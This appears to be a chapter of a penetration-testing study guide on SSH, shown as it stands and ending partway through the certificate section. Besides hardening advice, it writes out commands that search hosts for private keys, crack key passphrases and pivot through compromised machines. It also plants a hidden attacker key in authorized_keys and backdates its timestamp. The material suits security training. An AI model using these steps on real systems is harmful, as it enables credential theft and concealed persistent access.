
# 10 - SSH and Key Management

> **"SSH: Because telnet is for people who enjoy sharing passwords on the network."**

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Absolute Beginner's Guide](#absolute-beginners-guide)
3. [SSH Protocol Deep Dive](#ssh-protocol-deep-dive)
4. [Key Generation and Types](#key-generation-and-types)
5. [SSH Key Authentication](#ssh-key-authentication)
6. [SSH Configuration Hardening](#ssh-configuration-hardening)
7. [SSH Agent and Forwarding](#ssh-agent-and-forwarding)
8. [SSH Tunneling and Port Forwarding](#ssh-tunneling-and-port-forwarding)
9. [SSH Pivoting Techniques](#ssh-pivoting-techniques)
10. [SSH Key Theft and Abuse](#ssh-key-theft-and-abuse)
11. [SSH Certificate Authentication](#ssh-certificate-authentication)
12. [Common SSH Vulnerabilities](#common-ssh-vulnerabilities)
13. [OSCP Relevance](#oscp-relevance)
14. [Hands-On Labs](#hands-on-labs)
15. [Interview Questions](#interview-questions)
16. [Quick Reference](#quick-reference)

---

## Executive Summary

SSH (Secure Shell) is the **primary remote access protocol** for Unix/Linux systems and increasingly for Windows. Understanding SSH deeply is critical for:

- **Penetration testing**: Pivoting, lateral movement, key theft
- **System administration**: Secure remote access, automation
- **DevOps**: Git operations, CI/CD pipelines, infrastructure management

```
+-------------------------------------------------------------------+
|                      SSH OVERVIEW                                  |
+-------------------------------------------------------------------+

WHAT SSH PROVIDES:
  ✓ Encrypted communication channel
  ✓ Server authentication (host keys)
  ✓ Client authentication (password, keys, certs)
  ✓ Port forwarding (tunneling)
  ✓ File transfer (SCP, SFTP)

COMMON PORTS:
  22/tcp - Standard SSH
  2222/tcp - Common alternate
  Custom ports for security

AUTHENTICATION METHODS:
  - Password (least secure)
  - Public key (recommended)
  - Certificate (enterprise)
  - Keyboard-interactive (2FA)
  - GSSAPI (Kerberos)

+-------------------------------------------------------------------+
```

---

## Absolute Beginner's Guide

### What is SSH?

**Analogy: The Secure Telephone Call**
```
TELNET (old way):
  Like having a phone call on speaker phone in a crowded room.
  Everyone can hear your conversation (including passwords).
  
  Client: "Hi, my password is secret123"
  Attacker: *taking notes* "Excellent..."

SSH (secure way):
  Like having an encrypted phone call in a soundproof booth.
  Only you and the server can understand the conversation.
  
  Client: "xK9#mL@..." (encrypted)
  Attacker: "????"
```

### How SSH Works (Simplified)

```
+-------------------------------------------------------------------+
|                    SSH CONNECTION FLOW                             |
+-------------------------------------------------------------------+

1. CLIENT INITIATES CONNECTION
   Client: "Hello server, I want to connect via SSH"
   
2. KEY EXCHANGE (Diffie-Hellman)
   Both parties generate shared secret over public network
   (Like agreeing on a combination lock without saying numbers aloud)
   
3. SERVER AUTHENTICATION
   Server proves identity with host key
   Client: "Is that really you, server?"
   Server: *shows ID card (host key signature)*
   Client: "Okay, I recognize you"
   
4. CLIENT AUTHENTICATION
   Option A: Password
     Client: "My password is ******"
     Server: "Correct, you're in"
   
   Option B: Public Key (better!)
     Client: "Here's a signature only my private key could make"
     Server: "I have your public key, signature valid, you're in"

5. SECURE CHANNEL ESTABLISHED
   All further communication encrypted

+-------------------------------------------------------------------+
```

### SSH Key Authentication Explained

```
+-------------------------------------------------------------------+
|              PUBLIC KEY AUTHENTICATION                             |
+-------------------------------------------------------------------+

KEY PAIR CONCEPT:

  +-----------------+     +-----------------+
  |  PRIVATE KEY    |     |  PUBLIC KEY     |
  |  (id_rsa)       |     |  (id_rsa.pub)   |
  +-----------------+     +-----------------+
  |  Keep SECRET!   |     |  Share freely   |
  |  Never share    |     |  Give to servers|
  +-----------------+     +-----------------+
         |                        |
         |                        v
         |              +-----------------+
         |              | Server stores   |
         |              | in              |
         |              | authorized_keys |
         |              +-----------------+
         |
         v
  +-----------------+
  | Used to SIGN    |
  | authentication  |
  | challenge       |
  +-----------------+

AUTHENTICATION FLOW:

  1. Client connects, offers public key ID
  2. Server checks authorized_keys for matching public key
  3. Server sends random challenge encrypted with public key
  4. Client decrypts challenge with private key, signs it
  5. Server verifies signature → Authentication success!

ANALOGY:
  Public key = Lock that only you can open
  Private key = The only key that opens that lock
  
  Give out locks freely. Keep the key secret.
  Server puts your lock on door. Only you have key.

+-------------------------------------------------------------------+
```

---

## SSH Protocol Deep Dive

### SSH Protocol Architecture

```
+-------------------------------------------------------------------+
|                 SSH PROTOCOL LAYERS                                |
+-------------------------------------------------------------------+

+----------------------------------+
|         SSH Applications         |
|  (shell, sftp, scp, tunnels)    |
+----------------------------------+
|     SSH Connection Protocol      |
|   (channels, forwarding, etc.)  |
+----------------------------------+
|   SSH User Authentication        |
|   (password, publickey, etc.)   |
+----------------------------------+
|    SSH Transport Protocol        |
|  (encryption, integrity, KEX)   |
+----------------------------------+
|           TCP/IP                 |
+----------------------------------+

TRANSPORT LAYER:
  - Key Exchange (diffie-hellman-group-exchange-sha256)
  - Server Authentication
  - Encryption (aes256-ctr, chacha20-poly1305)
  - Integrity (hmac-sha2-256, umac-128)
  - Compression (optional)

USER AUTH LAYER:
  - None (anonymous, rarely allowed)
  - Password
  - Public Key
  - Keyboard-Interactive
  - GSSAPI (Kerberos)

CONNECTION LAYER:
  - Multiplexing channels
  - Shell sessions
  - Exec requests
  - Port forwarding
  - X11 forwarding

+-------------------------------------------------------------------+
```

### SSH Version and Algorithms

```bash
# Check SSH version
ssh -V
# OpenSSH_8.9p1 Ubuntu-3, OpenSSL 3.0.2 15 Mar 2022

# List supported algorithms
ssh -Q cipher     # Encryption algorithms
ssh -Q mac        # MAC algorithms
ssh -Q kex        # Key exchange algorithms
ssh -Q key        # Public key types

# Verbose connection shows negotiated algorithms
ssh -vvv user@host 2>&1 | grep -E "(kex|cipher|MAC)"
```

### SSH Packet Structure

```
+-------------------------------------------------------------------+
|                   SSH PACKET FORMAT                                |
+-------------------------------------------------------------------+

Binary Packet:
+------------------+------------------+------------------+
| Packet Length    | Padding Length   | Payload          |
| (4 bytes)        | (1 byte)         | (variable)       |
+------------------+------------------+------------------+
| Random Padding   | MAC              |
| (4-255 bytes)    | (varies)         |
+------------------+------------------+

After encryption:
+------------------+------------------+
| Encrypted Packet | MAC              |
| (block aligned)  | (integrity)      |
+------------------+------------------+

ENCRYPTION MODES:
  - aes256-ctr: Counter mode (streaming)
  - aes256-gcm: Galois Counter Mode (AEAD)
  - chacha20-poly1305: Modern AEAD cipher

+-------------------------------------------------------------------+
```

---

## Key Generation and Types

### SSH Key Types Comparison

```
+-------------------------------------------------------------------+
|                  SSH KEY TYPES                                     |
+-------------------------------------------------------------------+

TYPE         | SIZE      | SECURITY      | SPEED   | RECOMMENDATION
-------------|-----------|---------------|---------|----------------
RSA          | 2048-4096 | Good (3072+)  | Slow    | Legacy compatible
DSA          | 1024      | Weak          | Medium  | DEPRECATED, avoid
ECDSA        | 256-521   | Good          | Fast    | Good, but NSA curves
Ed25519      | 256       | Excellent     | Fastest | RECOMMENDED

DETAILED COMPARISON:

RSA:
  + Universal support
  + Proven security with large keys
  - Slow key generation
  - Large keys for equivalent security
  Minimum: 2048 bits, Recommended: 4096 bits

ECDSA:
  + Fast operations
  + Smaller keys
  - NIST curves (potential backdoor concerns)
  - Implementation complexity
  Use: nistp256, nistp384, nistp521

Ed25519 (Curve25519):
  + Fastest operations
  + Smallest keys (256 bits)
  + No NSA involvement
  + Side-channel resistant
  + Deterministic signatures
  - Requires OpenSSH 6.5+
  
RECOMMENDATION: Use Ed25519 unless compatibility requires RSA

+-------------------------------------------------------------------+
```

### Generating SSH Keys

```bash
# === RECOMMENDED: Ed25519 ===
ssh-keygen -t ed25519 -C "user@hostname"
# -C adds comment (identifies key)

# With custom filename
ssh-keygen -t ed25519 -f ~/.ssh/my_server_key -C "production server"

# === RSA (when Ed25519 not supported) ===
ssh-keygen -t rsa -b 4096 -C "user@hostname"

# === View key fingerprint ===
ssh-keygen -l -f ~/.ssh/id_ed25519.pub
# 256 SHA256:xYz123... user@hostname (ED25519)

# === Convert key formats ===
# PEM to OpenSSH
ssh-keygen -i -f key.pem > key_openssh

# OpenSSH to PEM
ssh-keygen -e -f key_openssh > key.pem

# === Generate from existing private key ===
ssh-keygen -y -f id_rsa > id_rsa.pub

# === Change passphrase ===
ssh-keygen -p -f ~/.ssh/id_ed25519
```

### Key File Permissions

```bash
# CORRECT PERMISSIONS (critical for security!)

# ~/.ssh directory
chmod 700 ~/.ssh

# Private keys
chmod 600 ~/.ssh/id_ed25519
chmod 600 ~/.ssh/id_rsa

# Public keys (less critical)
chmod 644 ~/.ssh/id_ed25519.pub

# authorized_keys
chmod 600 ~/.ssh/authorized_keys

# known_hosts
chmod 644 ~/.ssh/known_hosts

# config file
chmod 600 ~/.ssh/config

# Common error if permissions wrong:
# "Permissions 0644 for '/home/user/.ssh/id_rsa' are too open"
# "It is required that your private key files are NOT accessible by others"
```

### SSH Key Anatomy

```
+-------------------------------------------------------------------+
|                   SSH KEY STRUCTURE                                |
+-------------------------------------------------------------------+

PRIVATE KEY (id_ed25519):
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDl
... (base64 encoded key data) ...
-----END OPENSSH PRIVATE KEY-----

  Contents (when decoded):
  - Auth magic: "openssh-key-v1"
  - Cipher name (if encrypted): "aes256-ctr"
  - KDF name: "bcrypt"
  - KDF options: salt, rounds
  - Number of keys
  - Public key
  - Private key (encrypted if passphrase set)
  - Comment

PUBLIC KEY (id_ed25519.pub):
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@hostname
   |              |                          |
   +-- Type       +-- Base64 key data        +-- Comment

  The base64 data contains:
  - Key type length + type string
  - Key data

AUTHORIZED_KEYS FORMAT:
[options] key-type base64-key comment

Examples:
ssh-ed25519 AAAAC3... user@laptop

With options:
command="/bin/date" ssh-ed25519 AAAAC3... backup-script
from="192.168.1.*" ssh-ed25519 AAAAC3... admin@office
no-pty,no-X11-forwarding ssh-ed25519 AAAAC3... service-account

+-------------------------------------------------------------------+
```

---

## SSH Key Authentication

### authorized_keys Configuration

```bash
# Location: ~/.ssh/authorized_keys

# Basic entry
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... user@host

# With options (restrict access)

# Limit to specific command
command="/usr/bin/backup.sh" ssh-ed25519 AAAAC3... backup-key

# Limit source IP
from="192.168.1.0/24,10.0.0.*" ssh-ed25519 AAAAC3... office-key

# Disable features
no-pty,no-X11-forwarding,no-agent-forwarding ssh-ed25519 AAAAC3... service-key

# Force command with environment
command="/usr/local/bin/git-shell",no-pty ssh-ed25519 AAAAC3... git-key

# Restrict port forwarding
permitopen="localhost:3306" ssh-ed25519 AAAAC3... db-tunnel-key

# Time-based restriction (OpenSSH 8.7+)
expiry-time="20251231" ssh-ed25519 AAAAC3... temp-access-key

# Combined options
from="10.0.0.*",command="/bin/status.sh",no-pty,no-X11-forwarding ssh-ed25519 AAAAC3...
```

### known_hosts Management

```bash
# known_hosts stores server public keys for verification

# Format:
# hostname,[ip] key-type base64-key

# Hashed format (default on modern systems):
# |1|base64-salt|base64-hash key-type base64-key

# === MANAGEMENT COMMANDS ===

# Add host key manually
ssh-keyscan -H github.com >> ~/.ssh/known_hosts

# Remove host entry
ssh-keygen -R hostname

# Find host entry
ssh-keygen -F hostname

# Check for host
ssh-keygen -F hostname -f ~/.ssh/known_hosts

# === VERIFICATION ===
# Get server fingerprint
ssh-keyscan hostname 2>/dev/null | ssh-keygen -lf -

# Compare with what server shows
# [Server displays fingerprint on first connection]

# === COMMON ISSUE ===
# "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!"
# This means:
# 1. Server was reinstalled (new keys)
# 2. Man-in-the-middle attack!
# 3. IP address now points to different server

# If legitimate, remove old entry:
ssh-keygen -R hostname
```

### SSH Config File

```bash
# ~/.ssh/config - Client configuration

# Global defaults
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    AddKeysToAgent yes
    IdentitiesOnly yes

# Specific host configurations
Host webserver
    HostName web.example.com
    User admin
    Port 2222
    IdentityFile ~/.ssh/web_key

Host dbserver
    HostName 192.168.1.50
    User dba
    LocalForward 3306 localhost:3306
    IdentityFile ~/.ssh/db_key

Host jumpbox
    HostName jump.example.com
    User jumpuser
    IdentityFile ~/.ssh/jump_key

# Access internal server via jump host
Host internal
    HostName 10.0.0.50
    User admin
    ProxyJump jumpbox
    IdentityFile ~/.ssh/internal_key

# Wildcard patterns
Host *.dev.example.com
    User developer
    IdentityFile ~/.ssh/dev_key

Host bastion-*
    User ec2-user
    IdentityFile ~/.ssh/aws_key

# Git configuration
Host github.com
    HostName github.com
    User git
    IdentityFile ~/.ssh/github_key

# Now you can just use:
# ssh webserver
# ssh internal (automatically goes through jumpbox)
```

---

## SSH Configuration Hardening

### sshd_config Best Practices

```bash
# /etc/ssh/sshd_config - Server configuration

# === PROTOCOL AND AUTHENTICATION ===
Protocol 2                           # SSHv2 only (default now)
PermitRootLogin no                   # Disable direct root login
PermitRootLogin prohibit-password    # Alternative: allow with key only

MaxAuthTries 3                       # Limit auth attempts
LoginGraceTime 60                    # Time to authenticate

# === AUTHENTICATION METHODS ===
PasswordAuthentication no            # Disable password auth
PubkeyAuthentication yes             # Enable key auth
AuthenticationMethods publickey      # Require pubkey only
PermitEmptyPasswords no

# === KEY AND ALGORITHM SETTINGS ===
# Modern secure algorithms only
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes256-ctr
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512,rsa-sha2-256

# === ACCESS CONTROL ===
AllowUsers admin deploy              # Only these users
AllowGroups sshusers                 # Or group-based
DenyUsers root guest

# === NETWORK SETTINGS ===
Port 22                              # Consider changing (security through obscurity)
ListenAddress 0.0.0.0                # Or specific interface
AddressFamily inet                   # IPv4 only (or inet6, any)

# === FEATURES ===
X11Forwarding no                     # Disable unless needed
AllowTcpForwarding no                # Disable port forwarding
GatewayPorts no
PermitTunnel no
AllowAgentForwarding no              # Disable agent forwarding

# === CHROOT (for SFTP users) ===
Match Group sftponly
    ChrootDirectory /home/%u
    ForceCommand internal-sftp
    AllowTcpForwarding no
    X11Forwarding no

# === LOGGING ===
LogLevel VERBOSE                     # or INFO
SyslogFacility AUTH

# === TIMEOUTS ===
ClientAliveInterval 300              # 5 minutes
ClientAliveCountMax 2                # Disconnect after 10 min idle

# === BANNER ===
Banner /etc/ssh/banner.txt
```

### Testing SSH Configuration

```bash
# Test config syntax
sudo sshd -t

# Test with specific config
sudo sshd -t -f /etc/ssh/sshd_config

# Check effective settings
sudo sshd -T

# Test connection with verbose
ssh -vvv user@host

# Audit SSH server
ssh-audit host
# Shows supported algorithms and security issues

# Nmap SSH audit
nmap --script ssh2-enum-algos -p 22 host
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 host
```

---

## SSH Agent and Forwarding

### SSH Agent Basics

```bash
# SSH Agent holds decrypted private keys in memory
# Avoids entering passphrase repeatedly

# === START AGENT ===
eval $(ssh-agent)
# Agent pid 12345

# === ADD KEYS ===
# Add default key
ssh-add

# Add specific key
ssh-add ~/.ssh/my_key

# Add with timeout (key removed after X seconds)
ssh-add -t 3600 ~/.ssh/my_key

# === LIST KEYS ===
ssh-add -l
# 256 SHA256:xYz... user@host (ED25519)
# 4096 SHA256:aBc... user@host (RSA)

# === REMOVE KEYS ===
# Remove specific key
ssh-add -d ~/.ssh/my_key

# Remove all keys
ssh-add -D

# === LOCK/UNLOCK AGENT ===
ssh-add -x  # Lock with password
ssh-add -X  # Unlock
```

### Agent Forwarding

```
+-------------------------------------------------------------------+
|                   SSH AGENT FORWARDING                             |
+-------------------------------------------------------------------+

SCENARIO:
  Local → Server A → Server B
  
  Without forwarding:
    Local → Server A (using local key)
    Server A → Server B (need key on Server A - BAD!)
    
  With forwarding:
    Local → Server A (using local key)
    Server A → Server B (agent forwards to local key - GOOD!)

HOW IT WORKS:

  +--------+        +----------+        +----------+
  | Local  |  SSH   | Server A |  SSH   | Server B |
  | Agent  | =====> | (forward)| =====> |          |
  +--------+        +----------+        +----------+
       ^                 |
       |    Agent socket |
       +-----------------+
       
  Server A's SSH uses forwarded socket to access local agent
  Private key never leaves local machine!

USAGE:
  # Enable for single connection
  ssh -A user@serverA
  
  # Enable in config
  Host serverA
      ForwardAgent yes

  # Then on serverA:
  ssh user@serverB  # Uses forwarded agent!

+-------------------------------------------------------------------+
```

### Agent Forwarding Security Risks

```
+-------------------------------------------------------------------+
|              AGENT FORWARDING DANGERS                              |
+-------------------------------------------------------------------+

RISK: Root on intermediate server can hijack your agent!

ATTACK SCENARIO:

  1. You: ssh -A user@compromised_server
  
  2. Your agent socket created on compromised_server:
     /tmp/ssh-XXXX/agent.12345
     
  3. Attacker (root on compromised_server):
     export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
     ssh user@any_server_you_have_access_to
     
  4. Attacker accesses all servers your key can access!

MITIGATIONS:

  1. DON'T USE AGENT FORWARDING (best)
     Instead use ProxyJump:
     ssh -J jumphost internal_server
     
  2. If you must, limit exposure:
     - Short key timeouts: ssh-add -t 300
     - Only add needed keys
     - Use separate keys for different trust levels
     
  3. Confirm before adding:
     ssh-add -c ~/.ssh/high_security_key
     # Prompts before each use
     
  4. Use SSH certificates with short validity

+-------------------------------------------------------------------+
```

### ProxyJump (Safer Alternative)

```bash
# ProxyJump creates direct tunnel without agent forwarding

# Command line
ssh -J jumphost user@internal

# Multiple jumps
ssh -J jump1,jump2 user@internal

# SSH config
Host internal
    HostName 10.0.0.50
    User admin
    ProxyJump jumphost

Host jumphost
    HostName jump.example.com
    User jumpuser
    
# Now: ssh internal
# Creates: local → jumphost → internal
# No agent socket on jumphost!

# Old ProxyCommand method (still works)
Host internal
    ProxyCommand ssh -W %h:%p jumphost
```

---

## SSH Tunneling and Port Forwarding

### Local Port Forwarding

```
+-------------------------------------------------------------------+
|                 LOCAL PORT FORWARDING                              |
+-------------------------------------------------------------------+

PURPOSE: Access remote service via local port

SYNTAX: ssh -L local_port:destination:dest_port user@ssh_server

EXAMPLE: Access database on remote network

  Your Machine                   SSH Server                Database
  +----------+      SSH          +----------+              +--------+
  | :3306    | ================> | server   | -----------> | :3306  |
  | (local)  |      tunnel       |          |   internal   | (db)   |
  +----------+                   +----------+              +--------+
  
  Command: ssh -L 3306:dbserver:3306 user@sshserver
  
  Now: mysql -h 127.0.0.1 -P 3306
  Connects to dbserver:3306 via tunnel!

COMMON USES:
  # Access remote web admin
  ssh -L 8080:localhost:80 user@server
  # Browse: http://localhost:8080

  # Access database
  ssh -L 5432:localhost:5432 user@dbserver
  # Connect: psql -h 127.0.0.1

  # Access internal web app
  ssh -L 8443:intranet.internal:443 user@jumphost
  # Browse: https://localhost:8443

  # Multiple forwards
  ssh -L 8080:web:80 -L 3306:db:3306 user@server

+-------------------------------------------------------------------+
```

### Remote Port Forwarding

```
+-------------------------------------------------------------------+
|                REMOTE PORT FORWARDING                              |
+-------------------------------------------------------------------+

PURPOSE: Expose local service to remote network

SYNTAX: ssh -R remote_port:destination:dest_port user@ssh_server

EXAMPLE: Expose local web server to internet

  Your Machine                   SSH Server (public)
  +----------+      SSH          +----------+
  | :80      | <================ | :8080    |
  | (web)    |      tunnel       | (public) |
  +----------+                   +----------+
  
  Command: ssh -R 8080:localhost:80 user@publicserver
  
  Now anyone can: curl http://publicserver:8080
  Traffic tunnels back to your local port 80!

USES:
  # Expose local dev server
  ssh -R 8080:localhost:3000 user@server

  # Expose local SSH (reverse shell access!)
  ssh -R 2222:localhost:22 user@server
  # From server: ssh -p 2222 localuser@localhost
  
  # Share local file server
  ssh -R 8000:localhost:8000 user@server

NOTE: Server needs GatewayPorts yes for external access
      Default only binds to localhost on server

+-------------------------------------------------------------------+
```

### Dynamic Port Forwarding (SOCKS Proxy)

```
+-------------------------------------------------------------------+
|              DYNAMIC PORT FORWARDING (SOCKS)                       |
+-------------------------------------------------------------------+

PURPOSE: Create SOCKS proxy through SSH tunnel

SYNTAX: ssh -D local_port user@ssh_server

EXAMPLE: Browse entire remote network

  Your Browser                    SSH Server              Any Destination
  +----------+      SOCKS5        +----------+            +------------+
  | :9050    | ==================>| server   | ---------> | anywhere   |
  | proxy    |       tunnel       |          |            |            |
  +----------+                    +----------+            +------------+
  
  Command: ssh -D 9050 user@server
  
  Configure browser/app to use SOCKS5 proxy 127.0.0.1:9050
  All traffic goes through the SSH tunnel!

USES:
  # General browsing through remote network
  ssh -D 9050 user@server
  # Firefox: Settings → Network → SOCKS proxy → 127.0.0.1:9050
  
  # Metasploit through SOCKS
  ssh -D 1080 user@pivot
  # In MSF: setg Proxies socks5:127.0.0.1:1080
  
  # Proxychains
  ssh -D 9050 user@pivot
  # proxychains nmap -sT internal_target

SOCKS VS LOCAL FORWARD:
  Local forward: One destination, one port
  SOCKS: Any destination, any port (dynamic)

+-------------------------------------------------------------------+
```

### Tunnel Flags Reference

```bash
# === COMMON FLAGS ===
-L local:dest:port    # Local forward
-R remote:dest:port   # Remote forward
-D port               # Dynamic (SOCKS)
-N                    # No shell (just tunnel)
-f                    # Background after auth
-g                    # Allow external connections to local forward

# === EXAMPLES ===
# Background tunnel, no shell
ssh -fN -L 3306:db:3306 user@server

# SOCKS proxy, backgrounded
ssh -fN -D 9050 user@server

# Kill background tunnel
pkill -f "ssh -fN"

# Keep tunnel alive
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -N -L 3306:db:3306 user@server

# Tunnel with specific key
ssh -i ~/.ssh/tunnel_key -N -L 8080:web:80 user@server
```

---

## SSH Pivoting Techniques

### Pivoting Overview

```
+-------------------------------------------------------------------+
|                    SSH PIVOTING                                    |
+-------------------------------------------------------------------+

SCENARIO:
  Attacker → Compromised Host → Internal Network
  
  You've compromised a server with SSH access.
  Now you want to reach internal systems.

TECHNIQUES:

1. SOCKS PROXY (Dynamic forward)
   ssh -D 1080 compromised
   proxychains nmap internal_target

2. LOCAL FORWARDS (Specific ports)
   ssh -L 445:dc.internal:445 compromised
   smbclient //127.0.0.1/share

3. PROXYJUMP (Chain hosts)
   ssh -J compromised user@internal

4. SSH PIVOTING TOOLS
   - sshuttle (VPN over SSH)
   - Chisel (HTTP tunneling)
   - Ligolo-ng (modern tunneling)

+-------------------------------------------------------------------+
```

### sshuttle (VPN over SSH)

```bash
# sshuttle creates VPN-like setup over SSH
# Doesn't require root on remote, only local

# Basic usage - route subnet through SSH
sshuttle -r user@pivot 10.0.0.0/24

# Multiple subnets
sshuttle -r user@pivot 10.0.0.0/24 192.168.1.0/24

# All traffic except SSH
sshuttle -r user@pivot 0.0.0.0/0

# With specific key
sshuttle -r user@pivot --ssh-cmd "ssh -i ~/.ssh/key" 10.0.0.0/24

# DNS through tunnel too
sshuttle --dns -r user@pivot 10.0.0.0/24

# Exclude specific IPs
sshuttle -r user@pivot 10.0.0.0/24 -x 10.0.0.1

# Now you can:
nmap 10.0.0.100        # Directly!
curl http://10.0.0.50  # Directly!
# No proxychains needed
```

### Chisel (HTTP Tunneling)

```bash
# Chisel creates tunnels over HTTP (bypasses firewalls)

# === SERVER SIDE (on pivot) ===
./chisel server -p 8080 --reverse

# === CLIENT SIDE (attacker) ===
# SOCKS proxy
./chisel client pivot:8080 R:socks

# Local forward
./chisel client pivot:8080 R:3306:dbserver:3306

# Reverse shell tunnel
./chisel client pivot:8080 R:4444:127.0.0.1:4444

# === USAGE ===
# Now use SOCKS proxy on localhost:1080
proxychains nmap internal
```

### Multi-Hop Pivoting

```
+-------------------------------------------------------------------+
|                 MULTI-HOP PIVOT CHAIN                              |
+-------------------------------------------------------------------+

SCENARIO:
  Attacker → Host1 → Host2 → Host3 → Target
  
OPTION 1: ProxyJump Chain
  ssh -J host1,host2,host3 user@target

OPTION 2: Nested Tunnels
  # Terminal 1: Pivot through host1
  ssh -D 1080 user@host1
  
  # Terminal 2: Pivot through host2 via host1
  proxychains ssh -D 1081 user@host2
  
  # Terminal 3: Pivot through host3 via host2
  # ... continue

OPTION 3: SSH Config
  Host target
      ProxyJump host1,host2,host3
      User admin

+-------------------------------------------------------------------+
```

### Port Forwarding for Tools

```bash
# === METASPLOIT ===
# Create SOCKS proxy
ssh -D 1080 user@pivot

# Configure MSF
setg Proxies socks5:127.0.0.1:1080

# Now exploits route through pivot!

# === NMAP (with proxychains) ===
ssh -D 1080 user@pivot

# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.0.0.0/24

# Note: Only TCP connect scans work through SOCKS!

# === CRACKMAPEXEC ===
ssh -D 1080 user@pivot
proxychains crackmapexec smb 10.0.0.0/24

# === WEB SCANNING ===
ssh -D 1080 user@pivot
# Configure Burp/browser to use SOCKS proxy
```

---

## SSH Key Theft and Abuse

### Finding SSH Keys

```bash
# === COMMON KEY LOCATIONS ===
~/.ssh/id_rsa
~/.ssh/id_ed25519
~/.ssh/id_ecdsa
~/.ssh/id_dsa
~/.ssh/*.pem
/root/.ssh/
/home/*/.ssh/

# === FIND ALL KEYS ===
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# === SEARCH FOR KEYS IN FILES ===
grep -r "BEGIN.*PRIVATE KEY" /home/ 2>/dev/null
grep -r "BEGIN OPENSSH PRIVATE KEY" /home/ 2>/dev/null

# === CHECK COMMON BACKUP LOCATIONS ===
ls -la /var/backups/
ls -la /tmp/
ls -la /opt/

# === HISTORY FILES ===
cat ~/.bash_history | grep -E "(ssh|scp|sftp)"
cat ~/.bash_history | grep -i "id_rsa"

# === SSH CONFIG FOR TARGETS ===
cat ~/.ssh/config
cat /etc/ssh/ssh_config

# === KNOWN_HOSTS FOR TARGETS ===
cat ~/.ssh/known_hosts
# If not hashed, shows target hostnames!
```

### Cracking SSH Key Passphrases

```bash
# === EXTRACT HASH FOR CRACKING ===
# Using ssh2john
ssh2john id_rsa > ssh_hash.txt

# === CRACK WITH JOHN ===
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked password
john ssh_hash.txt --show

# === CRACK WITH HASHCAT ===
# SSH key hashes are mode 22911 (RSA/DSA), 22931 (ECDSA), 22921 (ED25519)
hashcat -m 22911 ssh_hash.txt rockyou.txt

# === COMMON PASSPHRASES TO TRY ===
# Empty passphrase (just try to use key)
ssh -i id_rsa user@host

# Common patterns:
# - Same as username
# - Company name + numbers
# - "password", "123456", etc.
```

### Using Stolen Keys

```bash
# === SET CORRECT PERMISSIONS ===
chmod 600 stolen_key

# === TEST CONNECTION ===
ssh -i stolen_key user@target

# If passphrase protected and cracked:
ssh -i stolen_key user@target
# Enter passphrase when prompted

# === ADD TO AGENT ===
ssh-add stolen_key

# === FIND WHERE KEY IS ACCEPTED ===
# Check authorized_keys for this public key
ssh-keygen -y -f stolen_key > stolen_key.pub
# Compare to target authorized_keys

# === PIVOT WITH STOLEN KEY ===
ssh -i stolen_key -D 1080 user@internal
```

### SSH Key Persistence

```bash
# === ADD ATTACKER KEY FOR PERSISTENCE ===
# Generate attacker key
ssh-keygen -t ed25519 -f attacker_key -N ""

# Add to target's authorized_keys
cat attacker_key.pub >> ~/.ssh/authorized_keys

# Now attacker can access anytime:
ssh -i attacker_key user@target

# === STEALTHY OPTIONS ===
# Add with restriction (harder to spot abuse)
echo 'command="/bin/bash",no-pty '$(cat attacker_key.pub) >> ~/.ssh/authorized_keys

# Add to system-wide authorized_keys
echo $(cat attacker_key.pub) >> /etc/ssh/authorized_keys

# === HIDING THE KEY ===
# Add to less obvious location
echo $(cat attacker_key.pub) >> ~/.ssh/authorized_keys2

# Backdated timestamp
touch -t 202001010000 ~/.ssh/authorized_keys
```

---

## SSH Certificate Authentication

### SSH Certificates Overview

```
+-------------------------------------------------------------------+
|                 SSH CERTIFICATE AUTHENTICATION                     |
+-------------------------------------------------------------------+

TRADITIONAL: Each server has authorized_keys with many public keys
CERTIFICATES: CA signs user keys; servers trust CA

BENEFITS:
  + No authorized_keys management on every server
  + Central certificate authority
  + Time-limited access (expiry)
  + Role-based access (principals)
  + Audit trail

ARCHITECTURE:

  +----------+         +----------+         +----------+
  |   CA     |  Signs  |   User   |  Proves |  Server  |
  | (private)| ------> |   Cert   | ------> |  Access  |
  +----------+         +----------+         +----------+
                                                  |
                                           Trusts CA public key

+-------------------------------------------------------------------+
```

### Creating SSH CA

```bash
# === CREATE CA KEY ===
ssh-keygen -t ed25519 -f ca_key -C "SSH Certificate Authority"

# === CONFIGURE SERVER TO TRUST CA ===
# On each server, add to /etc/ssh/sshd_config:
TrustedUserCAKeys /etc/ssh/ca_key.pub

# Copy CA public key to server
scp ca_key.pub root@server:/etc/ssh/

# Restart sshd
systemctl restart sshd

# === SIGN USER KEYS ===
# Sign user's public key
ssh-keygen -s ca_key \
    -I "user@example.com" \
    -n "deploy,admin" \
    -V +52w \
    ~/.ssh/id_ed25519.pub

# Options:
# -s ca_key        : CA private key for signing
# -I "identifier"  : Key identity (for logging)
# -n "principals"  : Usernames this cert can authenticate as
# -V +52w          : Valid for 52 weeks

# Output: id_ed25519-cert.pub

# === USER CONNECTS ===
# User connects normally; SSH finds and uses certificate
ssh user@server

# === VIEW CERTIFICATE ===
ssh-keygen -L -f id_ed25519-cert.pub
```

### Host Certificates

```bash
# === SIGN HOST KEYS ===
# This lets clients verify servers without known_hosts

# Sign server's host key
ssh-keygen -s ca_key \
    -I "server.example.com" \
    -h \
    -n "server.example.com,192.168.1.50" \
    /etc/ssh/ssh_host_ed25519_key.pub

# -h flag indicates host certificate
# -n includes hostnames/IPs

